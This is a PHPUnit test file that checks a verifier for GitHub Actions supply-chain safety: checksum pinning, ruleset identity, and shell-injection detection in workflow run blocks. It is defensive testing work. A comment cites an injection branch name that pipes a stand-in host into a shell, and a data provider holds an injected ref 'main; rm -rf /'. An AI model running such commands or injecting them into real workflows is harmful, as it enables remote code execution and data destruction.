<?php
/**
 * Contract tests for released reviewer/OpenCode automation dependencies.
 *
 * @package OpenCodeConnector
 */

declare(strict_types=1);

namespace OpenCodeConnector\Tests\Unit;

/**
 * Guards the traceability and checksum contract used by GitHub workflows.
 */
final class ReviewerDependencyTest extends MonkeyTestCase {

	/**
	 * Run the offline dependency verifier.
	 */
	public function test_reviewer_dependency_contract_is_valid(): void {
		$root = dirname( __DIR__, 2 );
		$output = array();
		$status = 0;
		exec( 'php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );

		self::assertSame( 0, $status, implode( "\n", $output ) );
		$manifest = json_decode( (string) file_get_contents( $root . '/.github/reviewer-dependency.json' ), true );
		self::assertIsArray( $manifest );
		self::assertSame( 'main', (string) $manifest['reviewer_ref'] );
		self::assertStringContainsString( (string) $manifest['reviewer_ref'], implode( "\n", $output ) );
	}

	/**
	 * The OpenCode installer must use the reviewed CLI and verify its hash.
	 */
	public function test_opencode_installer_has_pinned_checksum(): void {
		$source = (string) file_get_contents( dirname( __DIR__, 2 ) . '/.github/scripts/setup-opencode.sh' );

		self::assertStringContainsString( 'OPENCODE_VERSION:-v1.18.31', $source );
		self::assertStringContainsString( 'e9312be75ed803b7415fc2aeabda1f4fe938912a39673762dc0c38c0e11ebde4', $source );
		self::assertStringContainsString( 'd4e332f46b227448582c0d9fc75f6f826dfe95c9f751bc2011fc4d937a042be6', $source );
		self::assertStringContainsString( 'sha256sum -c', $source );

		$ci = (string) file_get_contents( dirname( __DIR__, 2 ) . '/.github/workflows/ci.yml' );
		self::assertSame( 2, substr_count( $ci, "'.github/workflows/*.yaml'" ) );
	}

	/**
	 * Hash drift in the manifest must fail the installer contract.
	 */
	public function test_verifier_rejects_manifest_installer_hash_drift(): void {
		$root = $this->copy_automation_fixture();
		try {
			$manifest_path = $root . '/.github/reviewer-dependency.json';
			$manifest = json_decode( (string) file_get_contents( $manifest_path ), true );
			self::assertIsArray( $manifest );
			$manifest['opencode_cli']['sha256']['linux-x64'] = $manifest['opencode_cli']['sha256']['linux-arm64'];
			$manifest['opencode_cli']['sha256']['linux-arm64'] = 'e9312be75ed803b7415fc2aeabda1f4fe938912a39673762dc0c38c0e11ebde4';
			file_put_contents( $manifest_path, json_encode( $manifest, JSON_PRETTY_PRINT ) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'does not match setup-opencode.sh architecture assignment', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * The verifier requires the exact active ruleset identities and check list.
	 */
	public function test_verifier_rejects_ruleset_identity_drift(): void {
		$root = $this->copy_automation_fixture();
		try {
			$manifest_path = $root . '/.github/reviewer-dependency.json';
			$manifest = json_decode( (string) file_get_contents( $manifest_path ), true );
			self::assertIsArray( $manifest );
			$manifest['merge_gate']['ruleset_id'] = 1;
			$manifest['merge_gate']['pull_request_ruleset_id'] = 2;
			$manifest['merge_gate']['required_checks'][] = 'unexpected-check';
			file_put_contents( $manifest_path, json_encode( $manifest, JSON_PRETTY_PRINT ) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			$text = implode( "\n", $output );
			self::assertStringContainsString( 'ruleset_id must be the active exact-check ruleset 23935160', $text );
			self::assertStringContainsString( 'pull_request_ruleset_id must be the active pull-request ruleset 23935219', $text );
			self::assertStringContainsString( 'required_checks must be exactly', $text );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Installer architecture mapping and duplicate assignments must fail closed.
	 */
	public function test_verifier_rejects_installer_architecture_drift(): void {
		$root = $this->copy_automation_fixture();
		try {
			$path = $root . '/.github/scripts/setup-opencode.sh';
			$source = (string) file_get_contents( $path );
			$source = str_replace( 'aarch64|arm64) ARCH="linux-arm64"', 'aarch64|arm64) ARCH="linux-x64"', $source );
			file_put_contents( $path, $source );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'must map aarch64|arm64 to linux-arm64', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A duplicate architecture hash assignment must not be accepted.
	 */
	public function test_verifier_rejects_duplicate_installer_assignments(): void {
		$root = $this->copy_automation_fixture();
		try {
			$path = $root . '/.github/scripts/setup-opencode.sh';
			$source = (string) file_get_contents( $path );
			$source .= "\n[linux-x64]=\"" . str_repeat( 'f', 64 ) . "\"\n";
			file_put_contents( $path, $source );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'exactly one SHA-256 assignment for linux-x64', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Complete manifest validation rejects omitted provenance and equal hashes.
	 */
	public function test_manifest_validator_rejects_incomplete_or_equal_integrity_data(): void {
		$root = $this->copy_automation_fixture();
		try {
			$manifest_path = $root . '/.github/reviewer-dependency.json';
			$manifest = json_decode( (string) file_get_contents( $manifest_path ), true );
			self::assertIsArray( $manifest );
			$manifest['reviewer_repository'] = 'wrong/repo';
			$manifest['release_published_at'] = 'not-a-date';
			$manifest['opencode_cli']['version'] = 'not-a-version';
			$manifest['opencode_cli']['sha256']['linux-x64'] = $manifest['opencode_cli']['sha256']['linux-arm64'];
			$manifest['merge_gate']['ruleset_id'] = 1;
			$manifest['merge_gate']['required_checks'] = array('wrong');
			file_put_contents( $manifest_path, json_encode( $manifest, JSON_PRETTY_PRINT ) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/validate-reviewer-manifest.php' ) . ' --file ' . escapeshellarg( $manifest_path ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			$text = implode( "\n", $output );
			self::assertStringContainsString( 'reviewer_repository', $text );
			self::assertStringContainsString( 'must be distinct', $text );
			self::assertStringContainsString( 'required_checks', $text );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A mutable .yaml workflow reference must not bypass the verifier.
	 */
	public function test_verifier_scans_yaml_workflows(): void {
		$root = $this->copy_automation_fixture();
		try {
			file_put_contents( $root . '/.github/workflows/extra.yaml', "name: Extra\\njobs:\\n  review:\\n    steps:\\n      - uses: nilesh32236/opencode-ai-reviewer@main\\n" );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'expected four reviewer action references', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A workflow that re-pins the reviewer to a SHA must fail verification.
	 *
	 * The manifest records a floating ref, so a SHA-pinned reference is drift:
	 * it would run a different revision than the manifest describes while
	 * still passing a casual read of the workflow.
	 */
	public function test_verifier_rejects_a_reintroduced_sha_pin(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			file_put_contents( $workflow, preg_replace(
				'#nilesh32236/opencode-ai-reviewer@main#',
				'nilesh32236/opencode-ai-reviewer@' . str_repeat( 'c', 40 ),
				(string) file_get_contents( $workflow ),
				1
			) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'instead of the manifest ref', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A stale "# vX.Y.Z" comment must fail verification.
	 *
	 * With a floating ref the comment claims a version that the ref no longer
	 * corresponds to, which is precisely the drift the manifest existed to
	 * prevent. Leaving one behind is how a reader would come to believe the
	 * dependency is pinned when it is not.
	 */
	public function test_verifier_rejects_a_stale_version_comment(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			file_put_contents( $workflow, str_replace(
				'nilesh32236/opencode-ai-reviewer@main',
				'nilesh32236/opencode-ai-reviewer@main # v1.22.0',
				(string) file_get_contents( $workflow )
			) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'stale version comment', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * The four read-back copies must stay identical.
	 *
	 * The step is repeated per job because jobs cannot share steps. Duplication
	 * is only safe while a future edit updates all four, so the verifier
	 * compares them; this test covers the fourth copy, which the verifier
	 * already exercises.
	 */
	public function test_verifier_rejects_a_drifted_read_back_copy(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			$source = (string) file_get_contents( $workflow );
			$position = strpos( $source, '      - name: Record the reviewer main at run start' );
			self::assertNotFalse( $position );
			$second = strpos( $source, '      - name: Record the reviewer main at run start', $position + 10 );
			self::assertNotFalse( $second );
			$source = substr( $source, 0, $second ) . str_replace( 'set -euo pipefail', 'set -uo pipefail', substr( $source, $second ) );
			file_put_contents( $workflow, $source );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'has drifted from the first', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * The dependency graph must not reference the removed updater, and every
	 * edge must resolve to a declared node.
	 */
	public function test_verifier_rejects_dependency_graph_drift(): void {
		$graph_relative = 'docs/architecture/DEPENDENCY-GRAPH.json';

		foreach ( array( 'removed-updater-node', 'dangling-edge' ) as $case ) {
			$root = $this->copy_automation_fixture();
			try {
				if ( ! is_dir( $root . '/docs/architecture' ) ) {
					mkdir( $root . '/docs/architecture', 0777, true );
				}
				$graph = json_decode( (string) file_get_contents( dirname( __DIR__, 2 ) . '/' . $graph_relative ), true );
				self::assertIsArray( $graph );
				if ( 'removed-updater-node' === $case ) {
					$graph['nodes'][] = array(
						'id'    => 'reviewer-updater',
						'kind'  => 'automation',
						'file'  => '.github/workflows/reviewer-update.yml',
					);
				} else {
					$graph['edges'][] = array(
						'from' => 'github',
						'to'   => 'ghost-node',
						'kind' => 'bogus',
					);
				}
				file_put_contents( $root . '/' . $graph_relative, json_encode( $graph, JSON_PRETTY_PRINT ) );
				$output = array();
				$status = 0;
				exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
				self::assertNotSame( 0, $status, $case . ' did not fail verification' );
			} finally {
				$this->remove_fixture( $root );
			}
		}
	}

	/**
	 * Attacker-controlled expressions must not be interpolated into a run: block.
	 *
	 * A pull request branch name, title, or comment body is free text chosen by
	 * whoever opened it. Embedded in a shell script it is not data, it is code:
	 * a branch named 'x"; curl evil.sh | sh; #' runs here. Repository-controlled
	 * expressions stay allowed, or the rule would flag a hundred safe uses and
	 * be ignored.
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider( 'unsafe_expressions' )]
	public function test_verifier_rejects_unsafe_interpolation_in_run_blocks( string $expression ): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			$source = (string) file_get_contents( $workflow );
			$anchor = strpos( $source, 'echo "ref=$PR_HEAD_REF"' );
			self::assertNotFalse( $anchor, 'fixture lost its read-back anchor' );
			$source = substr( $source, 0, $anchor )
				. 'echo "x=${{ ' . $expression . ' }}" >> "$GITHUB_OUTPUT"' . substr( $source, $anchor + strlen( 'echo "ref=$PR_HEAD_REF"' ) );
			file_put_contents( $workflow, $source );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status, $expression . ' was interpolated into a run: block without failing' );
			self::assertStringContainsString( 'interpolates ' . $expression, implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Repository-controlled expressions are not a shell injection.
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider( 'safe_expressions' )]
	public function test_verifier_allows_repository_controlled_interpolation( string $expression ): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			$source = (string) file_get_contents( $workflow );
			$anchor = strpos( $source, 'echo "ref=$PR_HEAD_REF"' );
			self::assertNotFalse( $anchor );
			$source = substr( $source, 0, $anchor )
				. 'echo "x=${{ ' . $expression . ' }}" >> "$GITHUB_OUTPUT"' . substr( $source, $anchor + strlen( 'echo "ref=$PR_HEAD_REF"' ) );
			file_put_contents( $workflow, $source );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertSame( 0, $status, $expression . ' should not be treated as attacker-controlled: ' . implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * The merge gate is tied to the real CI job, not to two hardcoded strings.
	 *
	 * Comparing the manifest against hardcoded names proved nothing about the
	 * repository: renaming the ci.yml job or dropping 8.2 from the matrix
	 * exited 0 while ruleset 23935160 still required those checks, silently
	 * disarming the gate.
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider( 'merge_gate_drift' )]
	public function test_verifier_rejects_merge_gate_drift( array $ci_edit, int $expected_status ): void {
		$root = $this->copy_automation_fixture();
		try {
			$ci = $root . '/.github/workflows/ci.yml';
			$source = (string) file_get_contents( $ci );
			$updated = str_replace( $ci_edit['from'], $ci_edit['to'], $source );
			self::assertNotSame( $source, $updated, 'fixture no longer contains the text this case edits' );
			file_put_contents( $ci, $updated );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertSame( $expected_status, $status, $ci_edit['label'] . ': ' . implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Merge-gate drift cases, each with the status it must produce.
	 *
	 * @return array<string, array{array{label:string,from:string,to:string},int}>
	 */
	public static function merge_gate_drift(): array {
		return array(
			'renamed job'  => array(
				array(
					'label' => 'renaming the required job',
					'from'  => 'name: PHPCS + PHPUnit (PHP ${{ matrix.php }})',
					'to'    => 'name: Renamed Job (PHP ${{ matrix.php }})',
				),
				1,
			),
			'dropped 8.2'  => array(
				array(
					'label' => 'dropping 8.2 from the matrix',
					'from'  => 'php: ["8.2", "8.3"]',
					'to'    => 'php: ["8.3"]',
				),
				1,
			),
			'added 8.4'    => array(
				array(
					'label' => 'extending the matrix',
					'from'  => 'php: ["8.2", "8.3"]',
					'to'    => 'php: ["8.2", "8.3", "8.4"]',
				),
				0,
			),
		);
	}

	/**
	 * A decoy line must not stand in for a real reviewer action's settings.
	 *
	 * Counting per file meant deleting the checksum requirement from one action
	 * and adding an identical line anywhere else kept the total correct while
	 * that action ran unverified. The requirement is counted inside each
	 * action's own with: block, so a decoy elsewhere cannot cover for it.
	 */
	public function test_verifier_rejects_a_decoy_checksum_requirement(): void {
		$root = $this->copy_automation_fixture();
		try {
			$review = $root . '/.github/workflows/ai-review.yml';
			$audit = $root . '/.github/workflows/daily-audit.yml';
			$real = "          require_opencode_checksum: true\n";

			// Remove the real requirement from the first reviewer action and put
			// an identical line into a different workflow entirely.
			$source = (string) file_get_contents( $review );
			$position = strpos( $source, $real );
			self::assertNotFalse( $position );
			file_put_contents( $review, substr( $source, 0, $position ) . substr( $source, $position + strlen( $real ) ) );
			$audit_source = (string) file_get_contents( $audit );
			file_put_contents( $audit, str_replace( '          enable_mcp: false', '          require_opencode_checksum: true' . "\n          enable_mcp: false", $audit_source ) );

			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status, 'a decoy in another workflow covered for a removed requirement' );
			self::assertStringContainsString( 'missing require_opencode_checksum', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A commented-out setting must not satisfy a required-count check.
	 */
	public function test_verifier_rejects_a_commented_out_checksum_requirement(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			$source = (string) file_get_contents( $workflow );
			// Replace only the first: replacing all three would test a
			// different condition than "one action lost its requirement".
			$needle = "          require_opencode_checksum: true\n";
			$at = strpos( $source, $needle );
			self::assertNotFalse( $at );
			$updated = substr( $source, 0, $at ) . "          # require_opencode_checksum: true\n" . substr( $source, $at + strlen( $needle ) );
			self::assertNotSame( $source, $updated );
			file_put_contents( $workflow, $updated );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'missing require_opencode_checksum', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * The manifest ref invariant is enforced, not merely documented.
	 *
	 * A manifest that claims a different ref would leave every workflow
	 * reference "wrong" by the verifier's own rule, so the failure is easy to
	 * miss. Reject the ref directly so the invariant is tested on its own.
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider( 'invalid_refs' )]
	public function test_verifier_rejects_a_manifest_ref_that_is_not_main( string $ref ): void {
		$root = $this->copy_automation_fixture();
		try {
			$manifest_path = $root . '/.github/reviewer-dependency.json';
			$manifest = json_decode( (string) file_get_contents( $manifest_path ), true );
			self::assertIsArray( $manifest );
			$manifest['reviewer_ref'] = $ref;
			file_put_contents( $manifest_path, json_encode( $manifest, JSON_PRETTY_PRINT ) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status, 'ref ' . $ref . ' was accepted' );
			self::assertStringContainsString( 'reviewer_ref must be the reviewer main branch', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Refs the manifest must not accept.
	 *
	 * @return array<string, array{string}>
	 */
	public static function invalid_refs(): array {
		return array(
			'sha'      => array( str_repeat( 'a', 40 ) ),
			'tag'      => array( 'v1.22.1' ),
			'branch'   => array( 'develop' ),
			'empty'    => array( '' ),
			'injected' => array( 'main; rm -rf /' ),
		);
	}

	/**
	 * A scalar run: keeps its body on the same line and must be checked too.
	 *
	 * The block form alone left `run: echo "${{ ...head.ref }}"` undetected,
	 * which is the same injection through a shorter door.
	 */
	public function test_verifier_rejects_unsafe_interpolation_in_a_scalar_run(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			$source = (string) file_get_contents( $workflow );
			$anchor_pos = strpos( $source, '      - name: Fix Issue' );
			self::assertNotFalse( $anchor_pos );
			file_put_contents( $workflow, substr( $source, 0, $anchor_pos )
				. "      - name: Scalar\n        run: echo \"\${{ github.event.pull_request.head.ref }}\"\n\n"
				. substr( $source, $anchor_pos ) );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status, 'a scalar run: interpolation was accepted' );
			self::assertStringContainsString( 'scalar run:', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Expressions whose value a pull request author chooses.
	 *
	 * @return array<string, array{string}>
	 */
	public static function unsafe_expressions(): array {
		return array(
			'head ref'   => array( 'github.event.pull_request.head.ref' ),
			'pr title'   => array( 'github.event.pull_request.title' ),
			'pr body'    => array( 'github.event.pull_request.body' ),
			'head_ref'   => array( 'github.head_ref' ),
			'comment'    => array( 'github.event.comment.body' ),
			'commit msg' => array( 'github.event.head_commit.message' ),
		);
	}

	/**
	 * Expressions fixed by the repository or the workflow file.
	 *
	 * @return array<string, array{string}>
	 */
	public static function safe_expressions(): array {
		return array(
			'repository' => array( 'github.repository' ),
			'run id'     => array( 'github.run_id' ),
			'server url' => array( 'github.server_url' ),
			'vars'       => array( 'vars.OPENCODE_MODEL' ),
			'secrets'    => array( 'secrets.GITHUB_TOKEN' ),
			'needs'      => array( 'needs.research.outputs.total' ),
		);
	}

	/**
	 * A commented-out reference is documentation, not configuration.
	 *
	 * Documenting a superseded pin in a comment is normal practice. Counting
	 * that line would inflate the expected-reference total and fail CI on an
	 * explanatory line, so the scan must ignore YAML comments.
	 */
	public function test_verifier_ignores_commented_out_references(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			file_put_contents( $workflow, (string) file_get_contents( $workflow )
				. "\n      # superseded: uses: nilesh32236/opencode-ai-reviewer@" . str_repeat( 'e', 40 ) . " # v1.22.0\n" );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertSame( 0, $status, implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A non-version comment beside the reference must be allowed.
	 */
	public function test_verifier_allows_a_non_version_comment(): void {
		$root = $this->copy_automation_fixture();
		try {
			$workflow = $root . '/.github/workflows/ai-review.yml';
			file_put_contents( $workflow, (string) file_get_contents( $workflow )
				. "\n        # keep in sync with daily-audit.yml\n" );
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			self::assertSame( 0, $status, implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * The removed updater must not come back with no driver.
	 *
	 * Its helper scripts wrote to the repository. Half of that machinery
	 * restored, with no workflow to call it, is the confusing state this
	 * check exists to prevent.
	 */
	public function test_verifier_rejects_resurrected_updater_machinery(): void {
		$removed = array(
			'.github/workflows/reviewer-update.yml',
			'.github/scripts/update-opencode-reviewer.php',
			'.github/scripts/push-reviewer-branch.sh',
			'.github/scripts/inspect-reviewer-branch.sh',
			'.github/scripts/reviewer-pr-guard.sh',
		);

		// One fixture, one verifier run. Restoring all five at once still proves
		// each is named in the failure, and avoids copying the automation tree
		// and spawning a verifier five times over.
		$root = $this->copy_automation_fixture();
		try {
			foreach ( $removed as $path ) {
				$full = $root . '/' . $path;
				if ( ! is_dir( dirname( $full ) ) ) {
					mkdir( dirname( $full ), 0777, true );
				}
				file_put_contents( $full, str_ends_with( $path, '.php' ) ? "<?php\n" : "#!/usr/bin/env bash\n" );
				chmod( $full, 0777 );
			}
			$output = array();
			$status = 0;
			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
			$text = implode( "\n", $output );
			self::assertNotSame( 0, $status, 'restored updater machinery did not fail verification' );
			foreach ( $removed as $path ) {
				self::assertStringContainsString( $path . ' must stay removed', $text );
			}
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * A floating ref is only defensible if the revision in use is observable.
	 *
	 * Every job that runs the reviewer records the resolved commit for that
	 * run. Without it, "the reference floats" means the run log cannot say what
	 * actually executed, which is the property the old pin provided.
	 */
	public function test_every_reviewer_job_records_the_revision_in_use(): void {
		$root = dirname( __DIR__, 2 );
		foreach ( array( 'ai-review.yml' => 3, 'daily-audit.yml' => 1 ) as $name => $expected ) {
			$source = (string) file_get_contents( $root . '/.github/workflows/' . $name );
			$references = substr_count( $source, 'uses: nilesh32236/opencode-ai-reviewer@main' );
			self::assertSame( $expected, $references, $name . ' reviewer reference count' );
			self::assertSame(
				$expected,
				substr_count( $source, 'Record the reviewer main at run start' ),
				$name . ' must record the reviewer main revision once per reviewer action'
			);
		}

		// The read-back must be a real resolution, not a placeholder, and it
		// must fail closed rather than record an empty value.
		$review = (string) file_get_contents( $root . '/.github/workflows/ai-review.yml' );
		self::assertStringContainsString( 'commits/main --jq .sha', $review );
		self::assertStringContainsString( '^[a-f0-9]{40}$', $review );
		self::assertStringContainsString( '$GITHUB_STEP_SUMMARY', $review );

		// The step records main as of run start, which is not necessarily the
		// commit the action step resolves. The step must say so; an earlier
		// revision claimed to record the exact revision in use, which the
		// jobs API cannot confirm because it redacts the resolved ref.
		self::assertStringContainsString( 'at the start of this run', $step_marker_source = $review );

		// The read-back only reads a public repository, so it must not use the
		// broader PAT. The reviewer action itself still does; that is separate.
		$token_start = strpos( $review, '      - name: Record the reviewer main at run start' );
		$token_end = strpos( $review, '      - name:', $token_start + 10 );
		$readback = substr( $review, $token_start, false === $token_end ? null : $token_end - $token_start );
		self::assertStringContainsString( 'GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}', $readback );
		self::assertStringNotContainsString( 'secrets.GH_PAT', $readback, 'the public read-back must not use the broader PAT' );

		// Scope the fail-closed assertion to the read-back step itself. Other
		// steps legitimately mask errors on best-effort label and PR edits,
		// so a whole-file check would either pass vacuously or force those
		// unrelated calls to change.
		$review_position = strpos( $review, '      - name: Record the reviewer main at run start' );
		self::assertNotFalse( $review_position );
		$step_end = strpos( $review, '      - name:', $review_position + 10 );
		$step = substr( $review, $review_position, false === $step_end ? null : $step_end - $review_position );
		self::assertStringContainsString( 'set -euo pipefail', $step );
		self::assertStringNotContainsString( '|| true', $step, 'the read-back must not mask a failed resolution' );
	}

	/**
	 * A manifest that still carries the retired release fields must fail.
	 */
	public function test_manifest_validator_rejects_retired_release_fields(): void {
		$root = $this->copy_automation_fixture();
		try {
			$manifest_path = $root . '/.github/reviewer-dependency.json';
			$manifest = json_decode( (string) file_get_contents( $manifest_path ), true );
			self::assertIsArray( $manifest );
			$manifest['release_commit'] = str_repeat( 'd', 40 );
			file_put_contents( $manifest_path, json_encode( $manifest, JSON_PRETTY_PRINT ) );
			$output = array();
			$status = 0;
			exec( 'php ' . escapeshellarg( $root . '/.github/scripts/validate-reviewer-manifest.php' ) . ' --file ' . escapeshellarg( $manifest_path ) . ' 2>&1', $output, $status );
			self::assertNotSame( 0, $status );
			self::assertStringContainsString( 'retired field release_commit', implode( "\n", $output ) );
		} finally {
			$this->remove_fixture( $root );
		}
	}

	/**
	 * Copy the automation files into an isolated temporary root.
	 *
	 * @return string Temporary root path.
	 */
	private function copy_automation_fixture(): string {
		$source_root = dirname( __DIR__, 2 );
		$temp_root = sys_get_temp_dir() . '/duoport-reviewer-' . bin2hex( random_bytes( 5 ) );
		mkdir( $temp_root . '/.github/scripts', 0777, true );
		mkdir( $temp_root . '/.github/workflows', 0777, true );
		copy( $source_root . '/.github/reviewer-dependency.json', $temp_root . '/.github/reviewer-dependency.json' );
		foreach ( glob( $source_root . '/.github/scripts/*.php' ) ?: array() as $file ) {
			copy( $file, $temp_root . '/.github/scripts/' . basename( $file ) );
		}
		copy( $source_root . '/.github/scripts/setup-opencode.sh', $temp_root . '/.github/scripts/setup-opencode.sh' );
		foreach ( glob( $source_root . '/.github/workflows/*.yml' ) ?: array() as $file ) {
			copy( $file, $temp_root . '/.github/workflows/' . basename( $file ) );
		}
		mkdir( $temp_root . '/docs/architecture', 0777, true );
		copy( $source_root . '/docs/architecture/DEPENDENCY-GRAPH.json', $temp_root . '/docs/architecture/DEPENDENCY-GRAPH.json' );
		return $temp_root;
	}

	/**
	 * Remove an isolated temporary fixture.
	 *
	 * @param string $root Fixture root.
	 * @return void
	 */
	private function remove_fixture( string $root ): void {
		if ( ! is_dir( $root ) ) {
			return;
		}
		$iterator = new \RecursiveIteratorIterator( new \RecursiveDirectoryIterator( $root, \FilesystemIterator::SKIP_DOTS ), \RecursiveIteratorIterator::CHILD_FIRST );
		foreach ( $iterator as $item ) {
			$item->isDir() ? rmdir( $item->getPathname() ) : unlink( $item->getPathname() );
		}
		rmdir( $root );
	}
}
